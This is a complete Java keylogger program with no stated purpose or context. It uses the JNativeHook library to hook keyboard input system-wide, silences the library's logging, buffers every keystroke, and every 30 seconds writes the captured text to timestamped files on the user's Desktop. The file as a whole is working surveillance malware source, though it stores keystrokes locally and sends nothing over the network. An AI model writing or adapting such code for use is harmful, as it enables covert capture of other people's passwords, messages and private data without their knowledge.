

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.FileWriter;
import java.io.IOException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Keylogger implements NativeKeyListener {
    private final ScheduledExecutorService scheduler;
    private final StringBuilder logBuffer;
    private final FileLogger fileLogger;

    public Keylogger() {
        this.scheduler = Executors.newScheduledThreadPool(1);
        this.logBuffer = new StringBuilder();
        this.fileLogger = new FileLogger("C:\\Users\\user\\Desktop\\");
    }

    public void start() {
        try {
            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.OFF); // Disable noisy logging
            logger.setUseParentHandlers(false);

            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(this);

            scheduler.scheduleAtFixedRate(this::scheduleSaveTask, 0, 30, TimeUnit.SECONDS);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void stop() {
        try {
            GlobalScreen.unregisterNativeHook();
        } catch (Exception e) {
            e.printStackTrace();
        }
        scheduler.shutdownNow();
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        synchronized (logBuffer) {
            switch (e.getKeyCode()) {
                case NativeKeyEvent.VC_ENTER -> logBuffer.append("[ENTER]\n");
                case NativeKeyEvent.VC_BACKSPACE -> logBuffer.append("[BACKSPACE]");
                case NativeKeyEvent.VC_SPACE -> logBuffer.append(" ");
                case NativeKeyEvent.VC_TAB -> logBuffer.append("[TAB]");
                default -> logBuffer.append(NativeKeyEvent.getKeyText(e.getKeyCode()));
            }
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {}

    /**
     *
     * @param e
     */
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {}

    private void scheduleSaveTask() {
        String logsCopy;
        synchronized (logBuffer) {
            logsCopy = logBuffer.toString();
            logBuffer.setLength(0);
        }
        fileLogger.save(logsCopy);
    }

    public static void main(String[] args) {
        Keylogger keylogger = new Keylogger();
        keylogger.start();

        Runtime.getRuntime().addShutdownHook(new Thread(keylogger::stop));

        try {
            Thread.currentThread().join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}

class FileLogger {
    private final String outputPath;

    public FileLogger(String outputPath) {
        this.outputPath = outputPath;
    }

    public void save(String data) {
        if (data == null || data.isEmpty()) return;

        String filename = generateFilename();
        try (FileWriter writer = new FileWriter(filename, true)) {
            writer.write(data);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private String generateFilename() {
        LocalDateTime now = LocalDateTime.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd_HH-mm-ss");
        return outputPath + "keylog_" + now.format(formatter) + ".txt";
    }
}
